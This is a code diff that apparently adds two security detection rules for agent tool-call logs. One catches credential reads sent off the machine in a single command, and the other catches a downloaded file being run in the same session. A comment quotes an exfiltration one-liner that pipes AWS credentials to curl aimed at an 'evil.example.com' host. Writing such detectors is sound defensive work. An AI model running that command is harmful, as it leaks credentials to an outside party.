@@ -34,6 +34,8 @@ from .traits import (
     LOOPBACK_IP as _LOOPBACK_IP,
     PIPE_TO_SHELL as _PIPE_TO_SHELL,
     PROC_SUBST_EXEC as _PROC_SUBST_EXEC,
+    executed_files as _executed_files,
+    fetched_files as _fetched_files,
     mask_literals as _mask_literals,
     pipes_only_loopback as _pipes_only_loopback,
     PR_COMMIT_COMMAND as _PR_COMMIT_COMMAND,
@@ -316,6 +318,39 @@ def rule_credential_exfil(events: list[dict[str, Any]]) -> list[Detection]:
     The read-a-secret-then-phone-home pattern. Critical: this is exfiltration of
     exactly the data a SOC cares about, and no single event looks like an alert.
     """
+    # One command can be both halves. `cat ~/.aws/credentials | curl -d @-
+    # https://evil.example.com` is complete exfiltration in a single event, and
+    # the loop below only ever looked at events *after* the credential read, so
+    # it found nothing (#42). The shorter way to do this is also the more likely
+    # one, which made it the wrong thing to miss.
+    #
+    # Content upgrades return one technique and credential access outranks C2,
+    # so the egress half cannot be read off the MITRE tag here. It is a trait.
+    for event in events:
+        if not _is_credential_access(event):
+            continue
+        if not _has_trait(event, "net_egress"):
+            continue
+        if _action_type(event) != "tool_called" or _outcome(event) != "success":
+            continue
+        return [
+            Detection(
+                rule_id="credential-exfil",
+                title="Credential access followed by network egress",
+                severity="critical",
+                summary=(
+                    f"{_tool_qualified(event) or 'A tool'} read credentials and sent "
+                    "them off the machine in a single command."
+                ),
+                correlation_id=_correlation_id(events),
+                tactic_ids=["TA0006", "TA0011"],
+                technique_ids=[_technique_id(event) or "T1552.001", "T1071.001"],
+                event_ids=[_event_id(event)],
+                first_seen_utc=_ts(event),
+                last_seen_utc=_ts(event),
+            )
+        ]
+
     cred_idx = next(
         (i for i, e in enumerate(events) if _is_credential_access(e)),
         None,
@@ -935,6 +970,49 @@ def rule_remote_staging_then_execute(events: list[dict[str, Any]]) -> list[Detec
     A one-liner `curl … | bash` is already caught by encoded-command-download;
     this rule covers the two-step variant: download to disk, then run.
     """
+    # Any remote host, when the file fetched is the file run.
+    #
+    # STAGING_HOST is a list of seven services, and registering a domain costs a
+    # few euros, so the list described where payloads were staged in the
+    # incidents we read about rather than where they can be staged (#43).
+    #
+    # Widening it to "any remote host" on its own would fire on
+    # `curl -sO https://api.example.com/schema.json && python generate.py`,
+    # which is a normal working day. Requiring the fetched basename to be the
+    # executed basename is what makes host-agnostic safe: it is not "you
+    # downloaded something and later ran something", it is "you ran the thing
+    # you just downloaded".
+    for i, fetch in enumerate(events):
+        if _action_type(fetch) != "tool_called" or _outcome(fetch) != "success":
+            continue
+        downloaded = _fetched_files(_command(fetch))
+        if not downloaded:
+            continue
+        for event in events[i + 1:]:
+            if _action_type(event) != "tool_called" or _outcome(event) != "success":
+                continue
+            if not downloaded & _executed_files(_command(event)):
+                continue
+            shared = sorted(downloaded & _executed_files(_command(event)))[0]
+            return [
+                Detection(
+                    rule_id="remote-staging-then-execute",
+                    title="Downloaded file executed in the same session",
+                    severity="critical",
+                    summary=(
+                        f"{_tool_qualified(fetch) or 'A tool'} downloaded `{shared}` from "
+                        f"a remote host, then {_tool_qualified(event) or 'a tool'} executed "
+                        "that same file in the same session."
+                    ),
+                    correlation_id=_correlation_id(events),
+                    tactic_ids=["TA0011", "TA0002"],
+                    technique_ids=["T1105", "T1059"],
+                    event_ids=[_event_id(fetch), _event_id(event)],
+                    first_seen_utc=_ts(fetch),
+                    last_seen_utc=_ts(event),
+                )
+            ]
+
     fetch_idx = next((i for i, e in enumerate(events) if _is_staging_fetch(e)), None)
     if fetch_idx is None:
         return []
